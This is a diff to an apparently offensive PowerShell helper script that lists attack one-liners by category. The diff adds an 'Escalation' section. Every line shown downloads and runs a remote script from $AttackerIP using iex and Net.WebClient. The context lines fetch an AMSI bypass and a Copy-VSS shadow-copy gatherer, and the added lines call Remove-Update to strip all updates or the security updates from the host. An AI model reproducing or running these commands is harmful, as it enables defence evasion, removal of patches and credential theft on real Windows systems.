@@ -8,6 +8,14 @@ $ExecutionArrayBypass = @(
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Bypass/Invoke-AmsiBypass.ps1`"); Invoke-AmsiBypass"| Out-String
 )
 
+$ExecutionArrayEscalation = @(
+
+"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Escalation/Remove-Update.ps1`"); Remove-Update All"| Out-String
+"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Escalation/Remove-Update.ps1`"); Remove-Update Security"| Out-String
+
+
+)
+
 $ExecutionArrayGather = @(
 
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Copy-VSS.ps1`"); Copy-VSS -Destination <Destination>"| Out-String
@@ -36,6 +44,10 @@ $ExecutionArrayShells = @(
 Start-Sleep -Milliseconds '250'
 Write-Host "Bypasses" -ForegroundColor 'Yellow'
 Write-Host $ExecutionArrayBypass
+
+Start-Sleep -Milliseconds '250'
+Write-Host "Escalation" -ForegroundColor 'Yellow'
+Write-Host $ExecutionArrayEscalation
 
 Start-Sleep -Milliseconds '250'
 Write-Host "Gather Scripts" -ForegroundColor 'Yellow'
